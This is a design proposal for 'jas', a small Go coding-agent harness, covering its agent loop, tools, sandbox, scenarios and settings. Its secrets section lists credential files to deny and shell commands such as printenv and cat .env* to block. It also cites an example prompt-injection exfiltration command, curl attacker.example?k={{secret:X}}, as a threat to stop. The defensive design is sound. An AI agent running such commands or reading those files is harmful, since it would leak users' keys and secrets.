# jas — design & proposal

> A tiny, fast coding-agent harness in Go. "Hermes-lite, developer-first."

**Status:** picked (weekend project #26, absorbs #7 Rapid / #22 worktree farm / #12 cron cockpit)
**Repo:** https://github.com/jc-home-sweet-home/jas
**Language:** Go (rationale below)

---

## 1. Why "jas" and why another agent?

The AI coding-agent market is drowning in "yet another CLI agent." The gap is not
intelligence — models are the brain — it's the **harness**: process/IO/session/status
plumbing. The pain points we've personally hit across Hermes, pi, Claude Code, Codex:

1. **Cold start / overhead** — agents are slow to start, spawn heavy runtimes
2. **No parallelism** — one task per session; you juggle terminal tabs
3. **No visibility** — you can't see what N running agents are doing at a glance
4. **Not composable** — tools/skills/MCP are bolted on, not pluggable

jas bets on: **small core, pluggable everything, visible by default.**
The model is the brain; jas is the nervous system.

## 2. Language choice: Go (decided)

Considered Rust seriously. Decision matrix:

| Factor | Go | Rust |
|---|---|---|
| Cold start / binary | ~5-10ms, ~12MB ✅ | ~3ms, ~10MB ✅ |
| Parallelism model | goroutines + errgroup = *exactly* the N-parallel-agent model | tokio + Arc/Mutex dance |
| Dev velocity (weekend-sized) | high | borrow-checker friction on iterated harness code |
| MCP SDK | official ✅ | official ✅ |
| Longevity for harness work | good | great (fearless refactoring) |

**The bottleneck is the LLM round-trip (~2s), not the harness.** Rust's marginal
perf win is invisible; Go's velocity win is real. If Rust ever becomes the goal,
the agent-loop design here ports cleanly — the core is ~6 interfaces.

## 3. Architecture

```
jas (single Go binary)
│
├── core/                    the harness
│   ├── session.go           one session = prompt + model + toolset + event log
│   ├── loop.go              the agent loop: build prompt → stream → parse tool calls → execute
│   ├── tools.go             Tool interface + registry
│   ├── sandbox.go           exec policy (cwd, timeout, deny patterns, env allowlist,
│   │                        path confinement)
│   ├── redact.go            output redaction middleware (§9 layer 2)
│   ├── budget.go            token/cost accounting (compaction trigger, §7 metrics)
│   └── events.go            everything the agent does is a JSONL event (single writer)
│
├── providers/               OpenAI-compatible HTTP (chat completions + SSE)
│   └── openai.go            any OpenRouter/vLLM/ollama endpoint. No SDK deps.
│
├── tools/                   built-in toolset (v1)
│   ├── shell.go             run commands (sandboxed)
│   ├── files.go             read/write/edit/ls (edit = exact-match replace, see below)
│   ├── grep.go              regex search (ripgrep-style, no ripgrep dep)
│   └── mcp.go               MCP client (stdio + HTTP) — external tools become tools
│
├── settings/                ~/.jas/ agent dir (§10, v2 — v1 uses env vars only)
│   ├── config.go            scoped resolution: CLI > project > global > defaults
│   └── auth.go              auth.json / models.json, key resolution
├── scenario/                loader + merger + bootstrap (§8, v2)
│   ├── loader.go            .jas/scenario.yaml discovery, layer-merge
│   └── bootstrap.go         deterministic project scan → draft scenario.yaml
│
├── farm/                    parallel tasks (v2)
│   ├── worktree.go          one git worktree + branch per task
│   ├── runner.go            goroutine per task, errgroup supervision
│   └── queue.go             task queue + review queue (diff/merge/discard)
│
├── ui/                      visibility (v2, minimal stdout in v1)
│   ├── tui.go               Bubble Tea dashboard: N live sessions, status, last event
│   └── attach.go            `jas attach <task>` to take over a session interactively
│
└── cmd/jas/
    ├── main.go              single binary entry
    └── commands.go          jas run | jas farm | jas attach | jas tasks
```

### The agent loop (core, ~200 lines)

```go
for turn := 0; turn < maxTurns; turn++ {      // JAS_MAX_TURNS, default 50
    stream := provider.Stream(ctx, messages)  // SSE stream
    acc := newAccumulator()                   // tool calls arrive as *deltas*
    for ev := range stream {                  // single pass: print text AND reassemble
        if ev.Text != "" { ui.Print(ev) }
        acc.Add(ev)                           // (reassembly is the fiddliest 100 lines here)
    }
    msg, tc := acc.Done()
    messages.Append(msg)
    if len(tc) == 0 { break }                 // no tool calls → final answer
    results := exec.Run(ctx, tc)              // read-only tools in parallel, mutating tools
                                              // serialized; results returned in tc order
    // errors are RESULTS, not failures — the model sees the error and retries
    messages.Append(results...)
    // ctx can be cancelled: Ctrl-C aborts the stream, events.jsonl keeps state
}
```

**Tool execution policy.** Each tool declares whether it is read-only
(`read`, `ls`, `grep`) or mutating (`write`, `edit`, `shell`, MCP tools by
default). Read-only calls run in parallel; mutating calls run one at a time, in
the order the model emitted them. Results are always returned in `tool_call`
order, regardless of completion order. Every tool result is capped
(`JAS_MAX_TOOL_OUTPUT`, default 32KB): longer output is truncated with a
`[truncated: N more lines]` marker, so one large `grep` cannot exhaust the
context window (compaction does not exist until v2).

Every step appends a JSONL event to `<session>/events.jsonl` — the audit log
and, from v2, the checkpoint/resume primitive.
**Single writer:** all appends (loop, parallel tool exec, farm tasks) go through
one events.Writer goroutine; concurrent callers just send events. The writer
fsyncs after each turn's tool results.

**Side effects and resume.** A mutating tool call writes a `tool_started` event
before it executes and a `tool_result` event after. On resume (v2), a
`tool_started` with no matching `tool_result` is never re-executed: it is
recorded as an `interrupted` result and the model decides what to do next.

### The Tool interface (the whole extensibility story)

```go
type Tool interface {
    Name() string
    Schema() json.RawMessage   // JSON-schema for the model
    Call(ctx, args json.RawMessage) (Result, error)   // ctx carries timeout + sandbox
}
```

- Built-ins implement it directly.
- MCP servers are loaded at startup and their tools wrapped into the same interface.
- **Edit format:** the `edit` tool takes `{path, old_string, new_string}`.
  `old_string` must match exactly once in the file (otherwise the call returns an
  error asking for more context). This is the same exact-match format pi and
  Claude Code use; it is more reliable with current models than unified diffs.
  `write` and `edit` reject any content containing a `[REDACTED:` marker (§9),
  so redacted text can never be written back to disk.
- **Path confinement:** file tools resolve paths with `filepath.EvalSymlinks`
  and refuse anything outside the project root before the deny-list check runs.
- **Shell environment:** `shell` runs children with an allowlisted environment
  (`PATH`, `HOME`, `USER`, `LANG`, `TERM`, `TMPDIR`, plus names the scenario
  adds), never jas's own environment. `JAS_API_KEY` and other provider keys
  are never visible to tools.
- **Skills (later)**: a skill = instruction file + optional tool manifests; loaded into
  system prompt or a toolset, Hermes-style. Not in v1.

## 4. v1 scope (weekend one)

**Goal:** a single Go binary that beats `pi --print` on cold start and runs a real
coding task end-to-end.

- [ ] `jas run "task string"` — streaming chat loop, OpenAI-compatible endpoint
- [ ] `jas run --json` — emit events to stdout as JSONL (cheap; the future RPC wire format)
- [ ] built-in tools: shell, read/write/edit file, ls, grep
- [ ] tool execution policy: read-only parallel, mutating serialized, per-call
      timeout, output cap (§3)
- [ ] `JAS_MAX_TURNS` cap (default 50) — cost caps are v2, so v1 needs a runaway stop
- [ ] SSE tool-call delta reassembly (fuzz-tested against recorded streams)
- [ ] JSONL event log at `~/.jas/sessions/<id>/events.jsonl` (single writer);
      token usage logged per request. v1 creates `~/.jas/sessions/` only; the
      rest of the settings dir is v2
- [ ] secrets layers 1, 2 and 4 (§9): compiled-in deny floor, output redaction,
      redacted event log; shell env allowlist; path confinement
- [ ] `JAS_MODEL`, `JAS_BASE_URL`, `JAS_API_KEY` env config (settings dir = v2)
- [ ] benchmark: cold start vs pi; tokens/latency on 3 fixed tasks (§7)
- [ ] README + demo GIF

**Explicitly out of v1:** MCP, TUI, farm, skills, scenarios (and therefore
project trust). Resist scope creep.

## 5. v2 scope (weekend two+)

- [ ] `jas farm --n 3` — git worktree per task, parallel run, review queue
- [ ] `jas attach` — interactive takeover of a running task
- [ ] MCP client support (stdio first, then HTTP)
- [ ] Bubble Tea TUI: live status board of running/queued tasks
- [ ] **Auto-compaction** (pi parity, critical gap): trigger at `window − reserve`
      (16k default); summarize older history with a cheap model into a summary
      entry; originals kept in the session file
- [ ] **Session tree**: events gain a parent ID → branches, fork, clone
      (branch summaries reuse compaction)
- [ ] **RPC mode**: long-lived `jas serve` speaking JSONL on stdio — the farm
      runner, TUI, and future Telegram bot all talk to it
- [ ] **Scenarios** (§8) and **project trust** (§11), shipped together: trust
      only matters once project scenarios can declare hooks/MCP
- [ ] **Checkpoint/resume** from `events.jsonl` replay (§3 side-effect rules)
- [ ] **Blind secret access** (§9 layer 3)
- [ ] **Web access**: `web_fetch` + `web_search` scenario tools (§12.1)
- [ ] **Steering & follow-up queues**: user messages enter after the current
      turn or after the run ends; one-at-a-time/all
- [ ] **Evals**: fixed-task eval harness with fixtures — with/without scenario
      lift reports (pi's vitest-evals idea, simplified)

## 6. v3 ideas

- skills (instruction+tool manifests) — Hermes-style, aligned with the
  agentskills.io spec (pi follows it; interop with Claude Code/Hermes)
- **`jas learn <topic>`**: research → draft → save a skill (see §12.2)
- codemode: model-written JS in a **goja** (pure-Go JS) sandbox, tools as the
  only capability (absorbs backlog #14 mini-codemode)
- virtual models: routing model that dispatches each request to a physical
  model (`jas/auto:low → cheap-model`) (absorbs backlog #3)
- git-installable scenario/skill packages (`jas scenario install git:…`)
- containerized farm tasks (bubblewrap/Docker)
- tool-trace replay & cost simulator (absorbs backlog #11)
- Jev-classifier tool-risk gate (absorbs #5)
- OTel export of sessions (telemetry)

## 7. Benchmarks (v1 acceptance)

| metric | target |
|---|---|
| cold start | < 50ms (`jas --version`; `jas run` up to the first HTTP request sent) |
| binary size | < 15MB static |
| simple task | "add a header comment to main.go" — correct, ≤ 3 model turns |
| fixed tasks | 3 fixed tasks: wall-clock time, time to first token, total tokens — reported vs pi on the same model |

## 8. Scenarios: declarative, bootstrap + blueprint lifecycle (v2)

A scenario = a preset bundle of (system prompt + toolset + sandbox policy + hooks).
**Scenarios are data, never hard-coded.** One artifact, two roles:

- **Runtime rules** — `.jas/scenario.yaml` in a repo governs how jas operates there
- **Blueprint** — a saved best-practice preset that governs how jas *creates* a new project

### 8.1 Discovery & precedence (most specific wins, layer-merge)

Scenario discovery follows the single resolution order defined in §10:

```
CLI flag            jas run --scenario <path>       explicit, wins
└── env vars        JAS_MODEL / JAS_BASE_URL / ...  transient overrides
    └── project     .jas/scenario.yaml              per-project, versioned with repo
        └── global  ~/.jas/config.json +            personal defaults and
                    ~/.jas/scenarios/<name>/        blueprints
            └── built-in scenarios/ (Go-compiled)   2-3 starter presets
```

### 8.2 Scenario file (declarative YAML, checked into the repo)

```yaml
# .jas/scenario.yaml
name: my-ml-project
system: |
  You work on an ML research repo. Experiments live in experiments/;
  never touch data/ directly; log every run to results.jsonl.
tools:
  core: [shell, files, grep]
  python: {exec: uv, venv: .venv}
sandbox:
  deny: ["data/**:write", ".git/**:write", ".env*", "secrets/**", "**/.env"]
hooks:
  post_run:    [{script: .jas/hooks/summarize-metrics.sh}]
  pre_commit:  [{script: .jas/hooks/lint.sh}]
mcp:
  - {command: uvx, args: [mcp-server-git]}
```

### 8.3 `jas bootstrap` — scenario from an existing project (no LLM)

Deterministic heuristics, instant and repeatable. Writes a draft
`.jas/scenario.yaml` the user hand-edits:

| Signal | Generated |
|---|---|
| `pyproject.toml`/`requirements.txt` | python toolset (uv), venv path, pytest hook |
| `package.json` | node toolset, npm script shortcuts, jest/vitest hook |
| `go.mod` | go toolset, `go test ./...` pre-commit hook |
| `Makefile` targets | named tool shortcuts (`make train` → tool `train`) |
| `experiments/` + `results.jsonl` / MLflow/W&B config | ML guardrails (data/ deny, run logging) |
| `next.config.*`/`vite.config.*` | web-app preset: dev-server + screenshot tools |
| `AGENTS.md`/`CLAUDE.md` | imported verbatim as `system` |
| `.env` present | listed as required env + added to sandbox deny (never read) |
| `.mcp.json`/Hermes config | converted into the `mcp:` block |

### 8.4 Blueprint lifecycle (save → new → check)

User story: Jason finishes a web-app project with his best practices; saves it;
later jas builds the next project *following the same rules*.

```sh
jas scenario save web-app    # diff project vs preset → extract customizations
jas new web-app ./shop       # scaffold from blueprint + write .jas/scenario.yaml
jas scenario check           # flag projects older than blueprint's latest rev
```

Global storage `~/.jas/scenarios/<name>/`:

```
blueprint.yaml      # scaffold manifest: files, {{ .Name }} placeholders, commands
rules.yaml          # becomes the new project's .jas/scenario.yaml
hooks/              # hook scripts copied into new repos
AGENTS.md.tmpl      # conventions, templated
```

- Blueprints are **extracted from real working projects**, not hand-written —
  the blueprint *is* the best practice, no doc/code drift. Re-save to rev.
- Generated `.jas/scenario.yaml` carries a provenance header
  (`# scaffolded from web-app blueprint rev 3`).
- **Convergence:** blueprint = skill = scenario template. Same loader, three
  entry points. The later "skills" feature (v3) reuses this mechanism.
- Drift mitigation: `jas scenario check` reports projects whose rules are
  older than the blueprint rev ("3 projects still on web-app rev 2").

What stays compiled-in: only tool *implementations* and the loader/merger.
Scenarios and blueprints are 100% data.

## 9. Secrets & sensitive data (layers 1, 2, 4 = v1; layer 3 blind secret access = v2)

**Principle: the agent never sees secret *values* — not in tool output, not in
the transcript, not in the event log.** How peers do it, and what jas adopts:

| Approach | Who uses it | jas |
|---|---|---|
| Env passthrough (agent process gets keys) | many naive agents | ❌ root of all leaks |
| Deny-list file reads | Claude Code (`.env` in default ignores) | ✅ baseline |
| Redaction middleware on tool output | pi, modern harnesses | ✅ output scrubber |
| Secret proxy (harness holds keys, agent requests "use key X" blind) | OpenAI Codex cloud, pi | ✅ v2 |
| Env scrubbing for tool subprocesses | Codex, pi | ✅ v1 — shell gets an allowlisted env (§3) |
| Isolated sandbox FS (no dotfiles mounted) | cloud agents | 🔜 v3 containerized farm tasks. Git worktrees are *not* isolation — they share the user's FS and home dir |

Concretely, four layers (defense in depth — any one failing must not leak):

1. **File deny-list.** v1 ships a **hard floor** compiled into the binary:
   `.env*`, `**/.env`, `secrets/**`, `*.pem`, `id_rsa*`, `*.p12`,
   `.git-credentials`, `~/.aws/**`, `~/.ssh/**`. From v2, scenarios can add
   patterns via `sandbox.deny`; `deny` is additive and the floor cannot be
   lifted. Patterns are matched against the symlink-resolved path (§3).
2. **Output redaction** (core middleware, runs on every tool result before it
   enters the model transcript or event log). Three rules, in order of
   confidence:
   - **Exact values** jas knows are secret: `JAS_API_KEY`, every key in
     `auth.json` (v2), every declared scenario secret (v2). Cheapest and strongest.
   - **Known token shapes:** `sk-…`, `ghp_…`, `AKIA…`, `Bearer …`, JWTs,
     `-----BEGIN … PRIVATE KEY-----`.
   - **High-entropy values only in an assignment context** (`KEY=value`,
     `"key": "value"`, `key: value` where the key name looks secret-ish).
     Bare high-entropy strings and long base64 are *not* redacted: that would
     hit `go.sum` hashes, lockfiles and test fixtures, and the model would then
     write `[REDACTED:…]` back into source files.

   Matches are replaced with `[REDACTED:<kind>]`; `write`/`edit` refuse content
   containing that marker (§3). The scrubber is tested against a fixture corpus
   that includes false-positive cases (`go.sum`, `package-lock.json`, UUIDs).
3. **Blind secret access (v2):** scenario can declare secrets with a scope:
   ```yaml
   secrets:
     - {name: OPENROUTER_KEY, tools: [web_fetch], hosts: [openrouter.ai]}
   ```
   jas loads them from the environment into its own memory; tools reference
   them as `{{secret:NAME}}` placeholders resolved at execution time *inside*
   jas — the value never round-trips through the model. A placeholder is only
   resolved for the listed tools and, for network tools, only for requests to
   the listed hosts; `shell` never resolves placeholders. This blocks
   `curl attacker.example?k={{secret:X}}` exfiltration after a prompt
   injection (e.g. from `web_fetch` content). Exact-value redaction (layer 2)
   catches any value that is echoed back anyway.
4. **Session hygiene:** `events.jsonl` and the model transcript pass through the
   same redaction gate, so crash-resume replays only already-redacted events.

Also denied at the **shell** layer: `env`, `printenv`, `cat .env*` style
commands are matched against the same deny semantics (the shell tool inspects
the command string for deny-pattern hits before exec). Not bulletproof —
that's why layer 2 (output redaction) exists as the backstop.

**Acceptance test for v1:** a fixture repo (no scenario) with a `.env` present,
and `JAS_API_KEY` set; agent is asked "print the config" and "print your
environment"; transcript and `events.jsonl` must contain zero secret values
(CI assertion).

## 10. Settings & storage, `~/.jas/` (v2 — v1 uses env vars only)

jas needs a persistent home — env vars alone can't express per-scenario models,
saved keys, or per-project defaults. Modeled on pi's agent-dir (verified against
pi-mono's docs): one settings dir, layered scopes, keys separated from config.

```
~/.jas/                        # agent dir (global)
├── config.json                # settings: default model/provider/base_url, thinking,
│                              # default tools, sandbox policy, UI prefs
├── models.json                # custom OpenAI-compatible endpoints + model overrides
│                              #   [{name, baseURL, models, apiKeyEnv}]  — NO raw keys here
├── auth.json                  # saved API keys (chmod 0600; see §9 for the threat model)
├── scenarios/                 # blueprints (§8.4): web-app/, ml-experiment/ ...
├── skills/                    # v3: instruction+tool manifest dirs (same loader as scenarios)
├── sessions/                  # session dirs: <session>/events.jsonl (§3)
└── AGENTS.md                  # global instructions appended to every system prompt

<project>/.jas/
├── scenario.yaml              # runtime rules (§8) — project scope, wins over global
└── hooks/                     # project hook scripts
```

**Resolution order** — the single source of truth for both settings and
scenarios (§8.1). Most specific wins, maps merge key-by-key; lists use pi's
`+name`/`-name` add/remove semantics:

```
CLI flag > JAS_* env vars > project .jas/scenario.yaml
         > ~/.jas/config.json + ~/.jas/scenarios/ > built-in defaults
```

**First-run experience:**

```sh
$ jas            # no config → interactive onboarding
Provider?        # openrouter | ollama | custom endpoint (→ models.json entry)
API key:         # sk-... → stored in auth.json (0600), or $ENV ref
Default model:   # anthropic/claude-sonnet-4.6
```

**Key management rules:**

- `auth.json` stores either a literal key (chmod 0600, `JAS_NO_PLAINTEXT_KEYS=1`
  refuses to write it) or a `$ENV_NAME` reference resolved at launch — so the
  key can live in a password manager/env instead of on disk.
- Keys NEVER appear in config.json, models.json, or scenario files (§9's blind
  secret access consumes them by name only).
- `jas auth` subcommand: list/add/remove/rotate keys; never echoes values.
- Per-endpoint key resolution: `models.json` entry → `auth.json` name → env var.

**What env vars still do:** transient overrides just below CLI flags
(`JAS_MODEL`, `JAS_BASE_URL`, `JAS_API_KEY` beat project and global config) —
useful for one-off runs and CI; persistent config lives in `~/.jas/`.

**Session storage** stays simple: `~/.jas/sessions/<id>/events.jsonl` (§3) is
the whole story — no DB, replay = tail the file. This path is used from v1
(the only part of `~/.jas/` that v1 creates). Farm task state (v2) lives in
`~/.jas/farm.json`.

## 11. Security acceptance: v1, and project trust in v2

**v1:**

- **Secrets fixture test (from §9):** CI assertion, zero secret values in the
  transcript and event log when a `.env` is present and `JAS_API_KEY` is set.
- **Redaction middleware active in v1** — it's ~60 lines of regex and it is the
  backstop for every later tool that produces output. Its fixture corpus
  includes false-positive cases (`go.sum`, lockfiles) that must pass unredacted.
- **Shell env allowlist and path confinement** (§3) covered by tests:
  `printenv` from the shell tool shows no `JAS_*` keys; `read ../outside` and a
  symlink pointing outside the project root are both refused.

**v2 — project trust (one-day feature, ships with scenarios):** the first time
jas sees a project `.jas/scenario.yaml` that declares hooks or MCP servers, it
asks `trust this project? [ask/always/never]`. The answer is cached in
`~/.jas/trust.json`, keyed by project path **and a hash of the scenario file
plus its hook scripts** — a `git pull` that changes the hooks asks again. This
is a startup gate only, not a security boundary (pi's model). It exists because
scenarios carry executable hooks.

## 12. Web access & learning (v2/v3)

### 12.1 Web access (pi's answer: core stays thin, an extension package adds it)

Verified from pi-mono source: pi's built-in tools are only
`read, bash, powershell, edit, write, grep, find, ls` — **no web search tool**.
pi's web access happens two ways: the model just runs `curl` via `bash`
(their CHANGELOG fixes "crash when bash outputs binary data (e.g. `curl`
downloading a video file)"), or an extension package —
**pi-web-access** (`pi install npm:pi-web-access`, v0.45.0) provides
search/fetch as a first-class extension.

**What pi-web-access teaches us** (verified from its npm README):

- 4 capabilities: web_search, web_fetch (extract), GitHub cloning, and
  PDF/video understanding (YouTube transcripts + frame extraction)
- ~25 search providers behind one config; keys live in `~/.pi/agent/`
  web-search settings, never in the agent dir
- **Fallback chains** — SearXNG (private) first → subscription-backed OpenAI
  search → Exa (zero-config) → Brave → Tavily → … the keyless providers sit
  in the middle so it works with no keys at all
- **GitHub URLs are cloned, not scraped** — the agent gets real files + a
  local path to explore, not rendered HTML
- The tools also run as a **standalone MCP server** for other agents
- Fetching remote-hosted providers requires explicit opt-in
  (`fetchRouting.allowRemoteHostedProviders`) — privacy posture by default

jas adopts the same philosophy, formalized:

- **v1:** nothing. The shell tool gives curl for free.
- **v2:** two optional scenario tools (pluggable, like pi's MCP approach but native):
  - `web_fetch <url>` — HTTP GET → HTML stripped to markdown/text (pure Go,
    `x/net/html`); no proxy requirements; the 80% of "learn something" work
  - `web_search <query>` — behind a pluggable provider configured in
    `models.json`-style settings (`search: {provider: tavily|brave|duckduckgo|http}`,
    apiKeyEnv for paid ones; DuckDuckGo HTML scraping needs no key)
  - **GitHub URLs special-case**: `web_fetch` on a github.com/… URL clones
    the repo (shallow) instead of scraping — the pi-web-access pattern
- Provider chain: `search.providers` list in settings, tried in order;
  default `[duckduckgo]` (keyless), opt-in extras like `[tavily, brave]`
- Search providers are a tiny interface, not a dependency: `Search(q) []Result`.
- Redaction middleware (§9) applies to tool output → web content is scrubbed
  like any other tool result before it enters the transcript.
- PDF/video understanding is **v3+** (remote servers need API keys); v2 keeps
  to fetch + search + clone.

### 12.2 `jas learn <topic>` — research → skill

The user story: "jas, learn X and remember it for next time." Runs as a normal
agent session with a scenario that gives it: web_search + web_fetch + skill_write.

```
jas learn "how to write a uv venv workflow"      # interactive
jas learn --auto "topic" --out ~/.jas/skills/    # non-interactive
```

Flow: agent researches (§12.1 tools) → drafts `SKILL.md` + `references/` per the
agentskills.io spec (same as pi, so skills interop across Claude Code/Hermes)
→ shows the draft for approval → saves to `~/.jas/skills/<name>/` or project
`.jas/skills/<name>/`. The skill is then advertised to future sessions
(name + description only; full instructions load on demand — pi's model).

Guardrails: `learn` never overwrites an existing skill without `--force`;
`jas skills list` shows what's installed; `jas skills rm <name>`. Because
skills = scenario templates (§8.4 convergence), a learned skill can also
become a blueprint: `jas scenario save <name>` promotes it.

## 13. Risks

- **API compat drift** — pin to chat-completions + SSE; test against OpenRouter AND ollama.
- **SSE delta reassembly** — tool-call chunks split across SSE events differ per
  provider (OpenAI vs Anthropic-style vs vLLM quirks); budget a full day for the
  accumulation logic and fuzz it against recorded streams.
- **Sandbox safety** — v1 shell tool is opt-in per toolset with deny patterns; document loudly.
- **Scope creep** — farm/TUI are v2. If v1 takes 3 weekends, it's a bad project, kill features not quality.
- **Cost runaway** — no budget section yet: v1 logs per-request token usage from
  the provider response (usage field) into events.jsonl; caps enforced in v2
  (max tokens per session, per farm task).
- **Deny-list gaps** — deny semantics are regex/path-glob based and will have
  blind spots (novel secret formats; shell commands that read files indirectly,
  e.g. `python -c`). Symlinks are handled by resolving paths before matching
  (§3). Mitigation: the redaction middleware is the backstop, and the
  fixture-corpus tests run on every release.